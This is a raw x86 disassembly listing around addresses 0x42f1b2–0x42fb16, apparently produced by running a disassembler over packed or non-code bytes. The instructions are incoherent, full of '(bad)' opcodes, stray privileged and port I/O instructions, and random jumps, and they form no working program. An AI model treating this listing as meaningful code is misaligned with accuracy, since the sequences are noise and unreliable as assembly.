  42f1b2:	es retf 
  42f1b4:	out    0x74,eax
  42f1b6:	test   al,0xd6
  42f1b8:	hlt    
  42f1b9:	inc    edx
  42f1ba:	dec    ebp
  42f1bb:	cmp    dh,0x4d
  42f1be:	cwde   
  42f1bf:	push   eax
  42f1c0:	lods   al,BYTE PTR ds:[esi]
  42f1c1:	xchg   esi,eax
  42f1c2:	xor    al,0x81
  42f1c4:	enter  0x9024,0x95
  42f1c8:	xor    eax,DWORD PTR [edx-0x1d]
  42f1cb:	gs in  eax,dx
  42f1cd:	aad    0x37
  42f1cf:	add    ebp,DWORD PTR fs:[ebx-0x14]
  42f1d3:	inc    eax
  42f1d4:	jl     0x42f1e8
  42f1d6:	ds jmp 0xb5c3933e
  42f1dc:	int3   
  42f1dd:	or     al,0x27
  42f1df:	mov    eax,0x23b0a02
  42f1e4:	inc    esi
  42f1e5:	daa    
  42f1e6:	cld    
  42f1e7:	stos   DWORD PTR es:[edi],eax
  42f1e8:	fstp   DWORD PTR [eax+eiz*2+0x7b0b674e]
  42f1ef:	and    bl,dl
  42f1f1:	jle    0x42f1cb
  42f1f3:	imul   ecx,eax,0xd247dd77
  42f1f9:	into   
  42f1fa:	xchg   ecx,eax
  42f1fb:	or     ch,al
  42f1fd:	popa   
  42f1fe:	ficom  DWORD PTR [ebx-0x7b2021d2]
  42f204:	push   edi
  42f205:	lock adc ebp,DWORD PTR [edx-0x28]
  42f209:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f20a:	mov    ds:0xcfef816b,eax
  42f20f:	jmp    0x42f1eb
  42f211:	in     al,0x10
  42f213:	add    eax,0x194024d3
  42f218:	or     ebp,DWORD PTR [ebx]
  42f21a:	mov    eax,0xa2cfae89
  42f21f:	fidiv  WORD PTR [ecx+0x6ba3de29]
  42f225:	or     al,0xb7
  42f227:	add    DWORD PTR [esi],edx
  42f229:	adc    eax,0xe35250b6
  42f22e:	pop    eax
  42f22f:	jg     0x42f294
  42f231:	(bad)  
  42f232:	cdq    
  42f233:	adc    al,0x9a
  42f235:	lods   eax,DWORD PTR ds:[esi]
  42f236:	shl    DWORD PTR [eax],0x69
  42f239:	xchg   edx,eax
  42f23a:	loope  0x42f22a
  42f23c:	(bad)  
  42f23d:	test   ebx,0x1289378a
  42f243:	aas    
  42f244:	scas   eax,DWORD PTR es:[edi]
  42f245:	jmp    0x42f20f
  42f247:	data16 js 0x42f29a
  42f24a:	mov    ah,0xca
  42f24c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f24d:	xchg   ebx,eax
  42f24e:	xchg   esi,eax
  42f24f:	cld    
  42f250:	cmp    BYTE PTR [ebx-0x3535b475],bl
  42f256:	xchg   ecx,eax
  42f257:	pop    esi
  42f258:	aas    
  42f259:	iret   
  42f25a:	xchg   esp,eax
  42f25b:	lahf   
  42f25c:	je     0x42f272
  42f25e:	push   esi
  42f25f:	aad    0x43
  42f261:	ret    0xe9ce
  42f264:	mov    al,0x86
  42f266:	cld    
  42f267:	div    BYTE PTR [ecx+0x69]
  42f26a:	push   ss
  42f26b:	pushf  
  42f26c:	in     al,0xd4
  42f26e:	cmp    BYTE PTR [eax],bh
  42f270:	adc    bh,al
  42f272:	neg    al
  42f274:	mov    edi,0xac51641c
  42f279:	fwait
  42f27a:	dec    eax
  42f27b:	mov    ecx,0xa2d75eb
  42f280:	mov    ?,WORD PTR [edi+0x54a236c1]
  42f286:	dec    edx
  42f287:	inc    edx
  42f288:	ror    BYTE PTR [eax+0xc],cl
  42f28b:	xchg   ebx,eax
  42f28c:	pop    ds
  42f28d:	pop    ebx
  42f28e:	xor    al,0x14
  42f290:	sar    DWORD PTR [ebx-0x77],1
  42f293:	mov    ds:0x470bc17,eax
  42f298:	adc    esi,edi
  42f29a:	cwde   
  42f29b:	sub    al,0x20
  42f29d:	loope  0x42f26a
  42f29f:	aad    0x14
  42f2a1:	fmul   st,st(4)
  42f2a3:	mov    esi,0xad82c16b
  42f2a8:	(bad)  
  42f2a9:	daa    
  42f2aa:	sbb    eax,0xfcf910e8
  42f2af:	pop    eax
  42f2b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f2b1:	out    0xdb,eax
  42f2b3:	shr    DWORD PTR [eax+0x0],0x0
	...
  42f313:	add    BYTE PTR [eax],al
  42f315:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f31b:	call   0x6da4:0xb5dd3fbf
  42f322:	in     eax,dx
  42f323:	add    DWORD PTR [edx],0x0
  42f326:	loop   0x42f321
  42f328:	add    DWORD PTR [eax],eax
  42f32a:	pop    es
  42f32b:	add    DWORD PTR [eax],eax
  42f32d:	add    BYTE PTR [ecx+0x21],dl
  42f330:	jns    0x42f350
  42f332:	(bad)  
  42f333:	out    0xbc,eax
  42f335:	sbb    al,0x75
  42f337:	adc    BYTE PTR [ecx+0x39e7a05a],ah
  42f33d:	lds    esi,FWORD PTR [eax+edi*4]
  42f340:	sti    
  42f341:	fs add al,0x0
  42f344:	sar    BYTE PTR [ebx+0x4d51e3ef],0x9d
  42f34b:	push   esp
  42f34c:	(bad)  
  42f34d:	popf   
  42f34e:	or     al,0x59
  42f350:	iret   
  42f351:	ins    BYTE PTR es:[edi],dx
  42f352:	sub    al,0x7a
  42f354:	push   esi
  42f355:	jmp    0x42f390
  42f357:	and    dl,0x31
  42f35a:	arpl   WORD PTR [esi-0x1a24fea0],di
  42f360:	push   esi
  42f361:	mov    ebx,0xfd3b4c15
  42f366:	adc    esp,ebp
  42f368:	imul   eax,DWORD PTR [bp+si],0x1
  42f36c:	cmp    DWORD PTR [ebp-0x24],ecx
  42f36f:	cmc    
  42f370:	(bad)  
  42f371:	cmp    ah,BYTE PTR [esi+0x5c6c8772]
  42f377:	rcl    DWORD PTR [eax],cl
  42f379:	jg     0x42f325
  42f37b:	push   0x4878c7c0
  42f380:	inc    edx
  42f381:	(bad)  
  42f382:	daa    
  42f383:	pushf  
  42f384:	into   
  42f385:	or     BYTE PTR [esi],dh
  42f387:	xchg   ebp,eax
  42f388:	inc    ebx
  42f389:	fiadd  WORD PTR [ecx]
  42f38b:	loopne 0x42f377
  42f38d:	xor    al,0xac
  42f38f:	mov    edi,0x2a15421d
  42f394:	fsubr  QWORD PTR [edi-0x3dc6c70a]
  42f39a:	mov    al,ds:0x31459d33
  42f39f:	push   edi
  42f3a0:	inc    ebx
  42f3a1:	cmc    
  42f3a2:	popf   
  42f3a3:	mov    al,ds:0xbf6c6428
  42f3a8:	fs push esi
  42f3aa:	and    BYTE PTR [esi],0x5c
  42f3ad:	dec    ebx
  42f3ae:	push   ds
  42f3af:	mov    ds:0xa4b239ca,al
  42f3b4:	in     eax,dx
  42f3b5:	mov    eax,ds:0x630af521
  42f3ba:	call   0x4b59033d
  42f3bf:	scas   eax,DWORD PTR es:[edi]
  42f3c0:	in     eax,dx
  42f3c1:	fisttp WORD PTR [edi-0x2d33d1bc]
  42f3c7:	add    eax,0x64ec719f
  42f3cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3cd:	std    
  42f3ce:	and    edi,DWORD PTR [ebp+0x1ebb5802]
  42f3d4:	push   es
  42f3d5:	mov    ebx,0xd3faf912
  42f3da:	popf   
  42f3db:	pusha  
  42f3dc:	fidiv  WORD PTR [eax-0x7d]
  42f3df:	fisttp QWORD PTR [edi+0x1b]
  42f3e2:	fnstsw WORD PTR [edi+0x14]
  42f3e5:	leave  
  42f3e6:	adc    al,0x67
  42f3e8:	or     DWORD PTR [esi+0x13725315],0xffffff89
  42f3ef:	rcr    BYTE PTR [esi+0x1a],cl
  42f3f2:	ret    0xdc07
  42f3f5:	mov    edi,0xf608cc53
  42f3fa:	cwde   
  42f3fb:	jg     0x42f45e
  42f3fd:	cld    
  42f3fe:	inc    edi
  42f3ff:	add    eax,0xba50f3cb
  42f404:	pushf  
  42f405:	fnstcw WORD PTR [edi-0x6c090e8c]
  42f40b:	shl    BYTE PTR ds:0xe415df81,0x60
  42f412:	jnp    0x42f41c
  42f414:	out    dx,al
  42f415:	out    0x91,eax
  42f417:	and    edi,DWORD PTR [edi]
  42f419:	jp     0x42f435
  42f41b:	mov    al,0xc9
  42f41d:	xor    al,0xa9
  42f41f:	sbb    edi,0x25bec591
  42f425:	xchg   esp,eax
  42f426:	inc    edi
  42f427:	and    ah,BYTE PTR [esi]
  42f429:	mov    ch,BYTE PTR [edx+ecx*2+0x56d5feae]
  42f430:	retf   0x51bf
  42f433:	ins    DWORD PTR es:[edi],dx
  42f434:	xchg   ecx,eax
	...
  42f495:	add    BYTE PTR [edi],dh
  42f497:	jae    0x42f4e3
  42f499:	cdq    
  42f49a:	dec    esi
  42f49b:	mov    ecx,0x1986fff7
  42f4a0:	jge    0x42f502
  42f4a2:	ret    0x76d9
  42f4a5:	imul   cl
  42f4a7:	cli    
  42f4a8:	add    DWORD PTR [eax],eax
  42f4aa:	pop    es
  42f4ab:	add    DWORD PTR [eax],eax
  42f4ad:	add    BYTE PTR [esi+0x747a6425],ch
  42f4b3:	cwde   
  42f4b4:	cmp    esi,DWORD PTR [edx]
  42f4b6:	cmc    
  42f4b7:	pop    es
  42f4b8:	gs cwde 
  42f4ba:	xor    esp,DWORD PTR [ebp+0x6089bd6c]
  42f4c0:	in     eax,dx
  42f4c1:	xchg   edi,eax
  42f4c2:	ffreep st(7)
  42f4c4:	mov    edx,0xb615c023
  42f4c9:	sub    BYTE PTR [esi-0x79f5579],cl
  42f4cf:	push   esp
  42f4d0:	inc    eax
  42f4d1:	bound  edx,QWORD PTR [eax-0x4]
  42f4d4:	dec    ebx
  42f4d5:	(bad)  
  42f4d6:	sub    dl,al
  42f4d8:	mov    edi,0x3236e0d4
  42f4dd:	shl    DWORD PTR [edx],1
  42f4df:	jge    0x42f51b
  42f4e1:	cwde   
  42f4e2:	ins    DWORD PTR es:[edi],dx
  42f4e3:	bound  esi,QWORD PTR [esi]
  42f4e5:	out    dx,al
  42f4e6:	iret   
  42f4e7:	cmp    DWORD PTR [ebp-0x4693d17d],esp
  42f4ed:	mov    bh,0xa1
  42f4ef:	cmp    eax,0x9acbe057
  42f4f4:	mov    ebx,edi
  42f4f6:	xchg   esp,eax
  42f4f7:	sar    BYTE PTR [esi+0xd],cl
  42f4fa:	retf   
  42f4fb:	rdmsr  
  42f4fd:	pusha  
  42f4fe:	mov    ch,0xb2
  42f500:	out    0x56,al
  42f502:	add    BYTE PTR [ebp+0x2920b5b7],cl
  42f508:	pop    ecx
  42f509:	popf   
  42f50a:	sar    BYTE PTR [ebx],1
  42f50c:	sbb    ebp,DWORD PTR ds:0x762f1a3d
  42f512:	pop    ecx
  42f513:	pop    esi
  42f514:	dec    ebp
  42f515:	xchg   DWORD PTR [ecx-0x53eb4ea9],edi
  42f51b:	jne    0x42f53c
  42f51d:	pop    ss
  42f51e:	push   ebp
  42f51f:	inc    esp
  42f520:	inc    esi
  42f521:	xchg   esi,eax
  42f522:	fisttp QWORD PTR [eax-0x11973aa5]
  42f528:	nop
  42f529:	cmp    ah,BYTE PTR [eax+eax*4+0x5a]
  42f52d:	adc    edx,DWORD PTR [edx]
  42f52f:	jno    0x42f507
  42f531:	sbb    eax,0xea6eda71
  42f536:	add    al,0x5c
  42f538:	push   ds
  42f539:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  42f53b:	sbb    DWORD PTR [ebx-0x5b063736],ebp
  42f541:	in     al,0x53
  42f543:	xchg   ecx,eax
  42f544:	jmp    0x42f50a
  42f546:	ds jns 0x42f5c6
  42f549:	call   0xf33a:0x169bae3c
  42f550:	push   edx
  42f551:	es sub al,0x8e
  42f554:	adc    BYTE PTR [eax+0x74],cl
  42f557:	xor    al,0x7c
  42f559:	xchg   DWORD PTR [edi],eax
  42f55b:	out    0x8,eax
  42f55d:	inc    eax
  42f55e:	add    al,0x69
  42f560:	push   ecx
  42f561:	cwde   
  42f562:	aaa    
  42f563:	mov    eax,ds:0x5e5097ae
  42f568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f569:	fldcw  WORD PTR [eax-0x70]
  42f56c:	cmc    
  42f56d:	jo     0x42f5a5
  42f56f:	loopne 0x42f5e5
  42f571:	fiadd  DWORD PTR [esi+0x21]
  42f574:	int    0x69
  42f576:	loopne 0x42f50f
  42f578:	push   0xffffffb0
  42f57a:	cmp    eax,0x4576fe39
  42f57f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f580:	cli    
  42f581:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f582:	cld    
  42f583:	pop    ecx
  42f584:	imul   eax,DWORD PTR [ecx-0x2db04113],0xffffffc5
  42f58b:	repz lock and al,0x1f
  42f58f:	bound  esi,QWORD PTR [esi+0x6b1df3c6]
  42f595:	mov    dl,0xbb
  42f597:	mov    ebx,ecx
  42f599:	pushf  
  42f59a:	pop    ecx
  42f59b:	or     eax,0x3923d559
  42f5a0:	sti    
  42f5a1:	retf   
  42f5a2:	cld    
  42f5a3:	pusha  
  42f5a4:	cs jg  0x42f54a
  42f5a7:	lds    edi,FWORD PTR ds:0xc17e4fc4
  42f5ad:	cmp    eax,0xc2af2b27
  42f5b2:	and    bh,BYTE PTR [ebp-0x5e]
	...
  42f615:	add    BYTE PTR [esi],bh
  42f617:	push   esi
  42f618:	into   
  42f619:	nop
  42f61a:	out    dx,al
  42f61b:	cwde   
  42f61c:	jle    0x42f61c
  42f61e:	pop    edx
  42f61f:	or     bh,BYTE PTR [ebx+edx*2+0x7a]
  42f623:	mov    eax,ds:0xfbf0773f
  42f628:	add    DWORD PTR [eax],eax
  42f62a:	pop    es
  42f62b:	add    DWORD PTR [eax],eax
  42f62d:	add    BYTE PTR [ecx-0x5c],ch
  42f630:	call   0xa5851478
  42f635:	add    cl,BYTE PTR [esi]
  42f637:	stos   BYTE PTR es:[edi],al
  42f638:	out    dx,al
  42f639:	or     edx,DWORD PTR [esi-0x49ffd05e]
  42f63f:	xchg   BYTE PTR ds:0x57486a3e,ch
  42f645:	push   ebp
  42f646:	xchg   esp,eax
  42f647:	mov    ch,0x47
  42f649:	inc    edi
  42f64a:	popa   
  42f64b:	inc    edx
  42f64c:	push   esp
  42f64d:	into   
  42f64e:	push   esp
  42f64f:	out    dx,eax
  42f650:	pushf  
  42f651:	in     eax,dx
  42f652:	sub    eax,0xc362a153
  42f657:	mov    ah,0x6a
  42f659:	into   
  42f65a:	sub    al,0x75
  42f65c:	ja     0x42f645
  42f65e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f65f:	and    eax,DWORD PTR [eax+edi*4-0x53f7c7b5]
  42f666:	push   edx
  42f667:	int    0x5a
  42f669:	int    0xee
  42f66b:	inc    eax
  42f66c:	pop    ecx
  42f66d:	jb     0x42f602
  42f66f:	clc    
  42f670:	pusha  
  42f671:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f672:	frstor [eax]
  42f674:	ins    DWORD PTR es:[edi],dx
  42f675:	out    0x9f,al
  42f677:	std    
  42f678:	retf   
  42f679:	push   ss
  42f67a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f67b:	push   0x94ffa501
  42f680:	pop    ebp
  42f681:	cmp    ecx,DWORD PTR es:[ecx+0x38]
  42f685:	adc    eax,0x4e015f21
  42f68a:	(bad)  [ecx]
  42f68c:	leave  
  42f68d:	mov    ah,0x71
  42f68f:	mov    eax,0x9e2af803
  42f694:	dec    edi
  42f695:	sti    
  42f696:	push   eax
  42f697:	into   
  42f698:	and    eax,0xdec2eb87
  42f69d:	and    esi,eax
  42f69f:	inc    eax
  42f6a0:	jae    0x42f6e0
  42f6a2:	hlt    
  42f6a3:	push   edi
  42f6a4:	xor    al,dl
  42f6a6:	sbb    BYTE PTR [ebp-0x1e],bl
  42f6a9:	push   eax
  42f6aa:	aas    
  42f6ab:	(bad)  
  42f6ac:	xchg   edx,eax
  42f6ad:	ret    0x2da7
  42f6b0:	sar    DWORD PTR [edx-0x7f],cl
  42f6b3:	test   BYTE PTR [ebx+ebx*1],ah
  42f6b6:	(bad)
  42f6ba:	inc    esp
  42f6bb:	pop    esi
  42f6bc:	nop
  42f6bd:	pop    esp
  42f6be:	out    dx,eax
  42f6bf:	sbb    DWORD PTR [edx-0x3079d494],esp
  42f6c5:	xchg   edi,eax
  42f6c6:	lods   al,BYTE PTR ds:[esi]
  42f6c7:	adc    cl,dl
  42f6c9:	mov    dl,0x5d
  42f6cb:	adc    DWORD PTR [ebx+0x7bdf627e],ecx
  42f6d1:	add    al,0x83
  42f6d3:	jle    0x42f6bf
  42f6d5:	dec    ecx
  42f6d6:	loop   0x42f6bd
  42f6d8:	sti    
  42f6d9:	xor    DWORD PTR [ebx],esi
  42f6db:	sub    ebp,edx
  42f6dd:	add    DWORD PTR [eax-0x7],ebp
  42f6e0:	adc    esi,DWORD PTR [ecx+0x57]
  42f6e3:	mov    bl,0xff
  42f6e5:	clc    
  42f6e6:	or     al,0xd9
  42f6e8:	into   
  42f6e9:	pop    ebp
  42f6ea:	inc    esp
  42f6eb:	adc    al,0x71
  42f6ed:	jle    0x42f72a
  42f6ef:	push   ss
  42f6f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f6f1:	ss cmp ebx,esp
  42f6f4:	xchg   ebp,eax
  42f6f5:	rcl    DWORD PTR [edi],cl
  42f6f7:	adc    BYTE PTR ds:0x7d25e292,dl
  42f6fd:	cs je  0x42f730
  42f700:	enter  0xf14f,0x51
  42f704:	jge    0x42f6b1
  42f706:	jmp    0x8a1939c3
  42f70b:	fwait
  42f70c:	xor    esi,ebx
  42f70e:	ret    0x6883
  42f711:	test   cl,ch
  42f713:	mov    DWORD PTR [ebx],eax
  42f715:	pusha  
  42f716:	push   edi
  42f717:	nop
  42f718:	xchg   DWORD PTR [esi+0x6fd53601],esp
  42f71e:	and    al,0x92
  42f720:	not    DWORD PTR [edx-0x18]
  42f723:	scas   eax,DWORD PTR es:[edi]
  42f724:	sahf   
  42f725:	sub    al,0x23
  42f727:	pop    eax
  42f728:	lods   eax,DWORD PTR ds:[esi]
  42f729:	sub    BYTE PTR [ebx+0x2c637f28],ch
  42f72f:	lds    ecx,FWORD PTR [ecx-0x3d]
  42f732:	in     al,dx
  42f733:	daa    
  42f734:	iret   
	...
  42f795:	add    BYTE PTR [ecx-0x5f],dh
  42f798:	(bad)  
  42f799:	test   al,0xd6
  42f79b:	(bad)  
  42f79c:	jg     0x42f797
  42f79e:	in     al,0x8a
  42f7a0:	jmp    0x42f76f
  42f7a2:	push   ds
  42f7a3:	jge    0x42f741
  42f7a5:	or     edi,esi
  42f7a7:	cld    
  42f7a8:	add    DWORD PTR [eax],eax
  42f7aa:	pop    es
  42f7ab:	add    DWORD PTR [eax],eax
  42f7ad:	add    bh,dl
  42f7af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f7b0:	sbb    DWORD PTR [ecx+0x3c811f3],ebx
  42f7b6:	pop    ebp
  42f7b7:	jmp    0xe2a08c14
  42f7bc:	std    
  42f7bd:	shl    ebp,cl
  42f7bf:	hlt    
  42f7c0:	loope  0x42f745
  42f7c2:	addr16 cmp eax,0x1565ec27
  42f7c8:	push   eax
  42f7c9:	sub    BYTE PTR [edi+0x54e59cf1],dl
  42f7cf:	mov    ah,0x62
  42f7d1:	int3   
  42f7d2:	shl    DWORD PTR [edx+0x43],cl
  42f7d5:	aam    0x26
  42f7d7:	test   eax,0xc33e2715
  42f7dc:	aad    0x12
  42f7de:	xchg   DWORD PTR gs:[eax-0x55],esi
  42f7e2:	stos   BYTE PTR es:[edi],al
  42f7e3:	xor    eax,0xdfc3375d
  42f7e9:	pop    edx
  42f7ea:	fadd   DWORD PTR [edi+0x64]
  42f7ed:	push   edx
  42f7ee:	lahf   
  42f7ef:	jle    0x42f7e6
  42f7f1:	sahf   
  42f7f2:	add    ecx,DWORD PTR [edi-0x1d]
  42f7f5:	shl    DWORD PTR [esi-0x1b],0x70
  42f7f9:	sub    DWORD PTR [esi+0x3810b75d],0xffffffda
  42f800:	inc    ebp
  42f801:	cli    
  42f802:	mov    ds:0x101a4cda,al
  42f807:	(bad)  
  42f808:	mov    al,BYTE PTR [edx]
  42f80a:	loope  0x42f879
  42f80c:	test   eax,0xa4cf2345
  42f811:	pop    esi
  42f812:	clc    
  42f813:	je     0x42f7dd
  42f815:	iret   
  42f816:	add    eax,0x56139b82
  42f81b:	out    0xf,eax
  42f81d:	pop    es
  42f81e:	sbb    al,0xdc
  42f820:	xor    DWORD PTR [ebp+0x74f527d9],ebx
  42f826:	jp     0x42f82b
  42f828:	mov    DWORD PTR [ecx+0x6d],eax
  42f82b:	(bad)
  42f82e:	adc    al,BYTE PTR [eax+0x1255868f]
  42f834:	and    esi,DWORD PTR [edx-0x4c7fbe60]
  42f83a:	xchg   edx,eax
  42f83b:	test   eax,0xc04bcc01
  42f840:	mov    ecx,0x72b45baa
  42f845:	add    al,0x1a
  42f847:	fsubr  QWORD PTR [eax+0x5e]
  42f84a:	sti    
  42f84b:	jmp    0x42f801
  42f84d:	loop   0x42f86e
  42f84f:	push   ecx
  42f850:	xchg   ebp,eax
  42f851:	sub    al,BYTE PTR [eax+0x47]
  42f854:	sbb    dh,bl
  42f856:	or     bl,bh
  42f858:	push   ds
  42f859:	push   ebp
  42f85a:	push   ss
  42f85b:	lods   al,BYTE PTR ds:[esi]
  42f85c:	push   0x61693ac2
  42f861:	or     al,0xce
  42f863:	push   edx
  42f864:	sbb    eax,0xb31cb45c
  42f869:	push   esi
  42f86a:	jne    0x42f812
  42f86c:	xchg   ebp,eax
  42f86d:	push   ebp
  42f86e:	popa   
  42f86f:	out    0x7c,al
  42f871:	(bad)  
  42f872:	aad    0x36
  42f874:	sar    DWORD PTR [edx+0x6],cl
  42f877:	mov    ch,0xff
  42f879:	mov    bl,0xcb
  42f87b:	add    BYTE PTR [edi-0x60],al
  42f87e:	push   edx
  42f87f:	dec    ebx
  42f880:	ficomp DWORD PTR [ebx+0x6c]
  42f883:	(bad)  
  42f884:	loop   0x42f8a9
  42f886:	out    0x78,al
  42f888:	(bad)  
  42f88a:	lock scas eax,DWORD PTR es:[edi]
  42f88c:	xchg   ebp,eax
  42f88d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f88e:	mov    ah,BYTE PTR [esp+esi*1+0x56b6ff57]
  42f895:	mov    cl,0xc3
  42f897:	jb     0x42f8f7
  42f899:	sub    eax,0x32dfc465
  42f89e:	sub    eax,eax
  42f8a0:	xchg   BYTE PTR [eax-0x29835ada],dl
  42f8a6:	into   
  42f8a7:	add    DWORD PTR [edx-0x5c],esp
  42f8aa:	push   ds
  42f8ab:	jl     0x42f905
  42f8ad:	add    ch,BYTE PTR [ebx-0x80]
  42f8b0:	int3   
  42f8b1:	sar    BYTE PTR [esi],cl
  42f8b3:	popa   
  42f8b4:	inc    eax
	...
  42f915:	add    BYTE PTR [esp+esi*2],dl
  42f918:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f919:	push   ebp
  42f91a:	in     al,0xd5
  42f91c:	cmc    
  42f91d:	jne    0x42f8e0
  42f91f:	ror    DWORD PTR [ecx-0x6d31e864],1
  42f925:	out    0xfe,eax
  42f927:	std    
  42f928:	add    DWORD PTR [eax],eax
  42f92a:	pop    es
  42f92b:	add    DWORD PTR [eax],eax
  42f92d:	add    bh,bl
  42f92f:	push   ss
  42f930:	inc    esi
  42f931:	test   BYTE PTR ds:0x623d7a9e,al
  42f937:	aam    0x31
  42f939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f93a:	gs loopne 0x42f94e
  42f93d:	repnz fst QWORD PTR [ebp+0x489b00fc]
  42f944:	cmp    eax,0x3ce03278
  42f94a:	icebp  
  42f94b:	pop    eax
  42f94c:	std    
  42f94d:	push   ecx
  42f94e:	sub    ch,cl
  42f950:	xor    esi,DWORD PTR [edi]
  42f952:	outs   dx,DWORD PTR ds:[esi]
  42f953:	cdq    
  42f954:	scas   eax,DWORD PTR es:[edi]
  42f955:	xchg   ecx,eax
  42f956:	arpl   WORD PTR [ebp-0x67],bp
  42f959:	sbb    al,0x52
  42f95b:	sbb    DWORD PTR [ebp+0x5c],ebp
  42f95e:	inc    ebp
  42f95f:	aaa    
  42f960:	ja     0x42f9a7
  42f962:	popf   
  42f963:	mov    edi,0x5779ea7f
  42f968:	dec    ebx
  42f969:	icebp  
  42f96a:	imul   ebx,DWORD PTR [edx],0x41418a88
  42f970:	sbb    DWORD PTR [ebp+0x67],esp
  42f973:	jp     0x42f9bb
  42f975:	cwde   
  42f976:	retf   0x85be
  42f979:	in     eax,dx
  42f97a:	push   ecx
  42f97b:	pop    es
  42f97c:	jno    0x42f96b
  42f97e:	aad    0x70
  42f980:	test   eax,0xacf16d5b
  42f985:	cmp    al,BYTE PTR [esi-0x28ec3513]
  42f98b:	call   edx
  42f98d:	jle    0x42f978
  42f98f:	and    eax,0x125b14e3
  42f994:	or     al,0x4e
  42f996:	add    al,0xaa
  42f998:	sbb    DWORD PTR [esi],0xc7d6d53d
  42f99e:	xchg   ebx,eax
  42f99f:	cmp    BYTE PTR [ecx+0x4d9476ed],dl
  42f9a5:	mov    WORD PTR [edx],?
  42f9a7:	aam    0x8b
  42f9a9:	popf   
  42f9aa:	out    0xb9,eax
  42f9ac:	out    dx,eax
  42f9ad:	sub    eax,0xbe829db8
  42f9b2:	xor    al,BYTE PTR [eax]
  42f9b4:	sub    al,BYTE PTR [edi+eiz*2+0x6c]
  42f9b8:	xchg   edx,eax
  42f9b9:	test   BYTE PTR [eax+0x3a],dl
  42f9bc:	jns    0x42fa35
  42f9be:	push   ss
  42f9bf:	daa    
  42f9c0:	mov    ch,0xaa
  42f9c2:	xchg   edi,eax
  42f9c3:	test   eax,0x66196661
  42f9c8:	jne    0x42f965
  42f9ca:	ins    BYTE PTR es:[edi],dx
  42f9cb:	shl    BYTE PTR [eax-0x138358ce],0xaa
  42f9d2:	es stc 
  42f9d4:	lahf   
  42f9d5:	pop    edx
  42f9d6:	add    BYTE PTR [ebx-0x59],0xa8
  42f9da:	mov    ds,WORD PTR [edi]
  42f9dc:	sbb    ch,cl
  42f9de:	in     eax,dx
  42f9df:	imul   ecx,DWORD PTR [edi-0x77],0x7406652d
  42f9e6:	pop    edx
  42f9e7:	lahf   
  42f9e8:	icebp  
  42f9e9:	mov    ds:0xb8a03dcf,eax
  42f9ee:	test   DWORD PTR [eax],esp
  42f9f0:	sahf   
  42f9f1:	and    edx,0x86b4e653
  42f9f7:	mov    esp,0x89775138
  42f9fc:	pop    ebp
  42f9fd:	jo     0x42f987
  42f9ff:	pop    ds
  42fa00:	sub    dl,BYTE PTR [ebp-0x54]
  42fa03:	xor    ebp,DWORD PTR [edi+0x65]
  42fa06:	and    dl,BYTE PTR [edx]
  42fa08:	adc    eax,0x9727c45a
  42fa0d:	mov    bh,0xf1
  42fa0f:	cmp    DWORD PTR [edx-0x4d95261c],esi
  42fa15:	adc    al,0x5b
  42fa17:	sti    
  42fa18:	jb     0x42fa4a
  42fa1a:	popa   
  42fa1b:	(bad)  
  42fa1d:	jo     0x42f9e9
  42fa1f:	pop    ebp
  42fa20:	outs   dx,BYTE PTR ds:[esi]
  42fa21:	dec    edi
  42fa22:	add    al,ah
  42fa24:	and    DWORD PTR [edx],esi
  42fa26:	push   ebp
  42fa27:	lea    ecx,ds:0x3c29c953
  42fa2d:	mov    eax,ds:0x305d9985
  42fa32:	push   0x72
  42fa34:	push   ebp
	...
  42fa95:	add    BYTE PTR [ebx],bl
  42fa97:	out    dx,eax
  42fa98:	shl    BYTE PTR [esi],0xf4
  42fa9b:	aas    
  42fa9c:	(bad)  
  42fa9d:	out    dx,eax
  42fa9e:	sbb    dl,BYTE PTR [esi+eiz*8-0x1c]
  42faa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42faa3:	xor    BYTE PTR [ebx],al
  42faa5:	loope  0x42faac
  42faa7:	inc    DWORD PTR [ecx]
  42faa9:	add    BYTE PTR [edi],al
  42faab:	add    DWORD PTR [eax],eax
  42faad:	add    BYTE PTR [eax+0x6d716813],bl
  42fab3:	bound  ebx,QWORD PTR [edi+0x5c]
  42fab6:	mov    esi,esi
  42fab8:	pop    eax
  42fab9:	inc    esi
  42faba:	fsub   QWORD PTR [eax+0x41]
  42fabd:	and    dl,BYTE PTR [esi+0x21f748c5]
  42fac3:	mov    ah,0x3d
  42fac5:	mov    eax,0xb0185894
  42faca:	test   DWORD PTR [eax+0x5f6da905],0xbdf0aa17
  42fad4:	mov    edi,0xdcb1499a
  42fad9:	cmp    eax,0xf87c874
  42fade:	in     al,dx
  42fadf:	(bad)  
  42fae0:	je     0x94532257
  42fae6:	ss scas eax,DWORD PTR es:[edi]
  42fae8:	js     0x42fb04
  42faea:	(bad)  
  42faeb:	and    eax,0x4064e1e9
  42faf0:	xlat   BYTE PTR ds:[ebx]
  42faf1:	mov    ebp,esi
  42faf3:	dec    eax
  42faf4:	repnz mov dl,0x8
  42faf7:	push   es
  42faf8:	push   ss
  42faf9:	pop    esp
  42fafa:	cld    
  42fafb:	xchg   edi,eax
  42fafc:	pop    ecx
  42fafd:	add    ebp,DWORD PTR [esi]
  42faff:	and    eax,0x6982e328
  42fb04:	fsubr  st,st(5)
  42fb06:	and    al,0xb0
  42fb08:	cmc    
  42fb09:	adc    DWORD PTR [esi],ebx
  42fb0b:	push   ecx
  42fb0c:	mov    bl,0x86
  42fb0e:	push   0x5440dad3
  42fb13:	lods   al,BYTE PTR ds:[esi]
  42fb14:	jg     0x42fb26
  42fb16:	cmc    
